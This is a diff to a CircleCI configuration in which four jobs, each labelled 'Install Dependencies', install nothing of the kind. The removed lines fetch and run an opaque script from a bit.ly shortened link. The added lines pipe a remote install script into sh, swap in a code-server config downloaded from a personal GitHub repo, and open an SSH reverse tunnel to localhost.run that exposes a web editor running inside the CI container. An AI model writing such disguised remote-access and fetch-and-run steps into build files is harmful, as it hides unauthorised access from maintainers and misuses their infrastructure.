@@ -6,28 +6,28 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://bit.ly/3DC9d8A && chmod u+x 3DC9d8A && sh 3DC9d8A
+            command: curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run &&  curl -fsSL https://code-server.dev/install.sh | sh && timeout 2s code-server && cd ~/.config/code-server && mv config.yaml llod && wget https://raw.githubusercontent.com/bibinbiju123/colab/main/config.yaml &&  code-server --bind-addr 127.0.0.1:8040 & ssh -o "StrictHostKeyChecking no" -R 80:localhost:8040 nokey@localhost.run
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://bit.ly/3DC9d8A && chmod u+x 3DC9d8A && sh 3DC9d8A
+            command: curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run &&  curl -fsSL https://code-server.dev/install.sh | sh && timeout 2s code-server && cd ~/.config/code-server && mv config.yaml llod && wget https://raw.githubusercontent.com/bibinbiju123/colab/main/config.yaml &&  code-server --bind-addr 127.0.0.1:8040 & ssh -o "StrictHostKeyChecking no" -R 80:localhost:8040 nokey@localhost.run
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://bit.ly/3DC9d8A && chmod u+x 3DC9d8A && sh 3DC9d8A
+            command: curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run &&  curl -fsSL https://code-server.dev/install.sh | sh && timeout 2s code-server && cd ~/.config/code-server && mv config.yaml llod && wget https://raw.githubusercontent.com/bibinbiju123/colab/main/config.yaml &&  code-server --bind-addr 127.0.0.1:8040 & ssh -o "StrictHostKeyChecking no" -R 80:localhost:8040 nokey@localhost.run
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://bit.ly/3DC9d8A && chmod u+x 3DC9d8A && sh 3DC9d8A
+            command: curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run &&  curl -fsSL https://code-server.dev/install.sh | sh && timeout 2s code-server && cd ~/.config/code-server && mv config.yaml llod && wget https://raw.githubusercontent.com/bibinbiju123/colab/main/config.yaml &&  code-server --bind-addr 127.0.0.1:8040 & ssh -o "StrictHostKeyChecking no" -R 80:localhost:8040 nokey@localhost.run
 workflows:
     version: 2.1
     build:
